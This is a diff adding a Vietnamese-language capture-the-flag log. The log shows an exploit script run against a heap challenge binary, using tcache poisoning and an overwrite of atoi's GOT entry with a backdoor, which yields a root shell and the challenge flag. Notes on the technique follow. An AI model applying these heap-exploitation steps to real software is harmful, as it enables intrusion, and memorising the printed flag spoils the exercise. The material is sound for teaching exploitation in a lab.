@@ -1,0 +1,32 @@
+Moi truong: Ubuntu 24.04.4 LTS, glibc 2.39-0ubuntu8.9, gcc 13.3.0. ASLR BAT.
+
+$ ./build.sh
+[*] built: noteapp
+[*] flag.txt san sang
+
+$ python3 exploit.py
+[*] '.../noteapp'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    SHSTK:      Enabled
+    IBT:        Enabled
+[+] Starting local process './noteapp'
+[*] heap_base = 0x3b41b000
+[*] atoi@got(0x404050) <- backdoor(0x401296)
+[backdoor] GOT bi ghi de -> /bin/sh
+===PWNED_9_4===
+uid=0(root) gid=0(root) groups=0(root)
+PTIT{h3ap_n0t3_tc4ch3_p0is0n_2026}
+===END===
+
+[+] capstone OK: GOT overwrite (atoi->backdoor) -> shell -> flag
+
+Ghi chu:
+  - heap_base ngau nhien (vi du 0x3b41b000) vi ASLR bat; exploit tinh ra tu leak.
+  - atoi@got (0x404050) da can 16 nen qua aligned_OK. Tranh dung o GOT dau tien
+    (free@got = 0x404000) vi header cua chunk do de len cac o GOT dat truoc cua loader.
+  - Kich hoat: sau khi atoi@got = backdoor, moi lan nhap so (vi du idx cua 'add')
+    deu chay backdoor() -> /bin/sh.
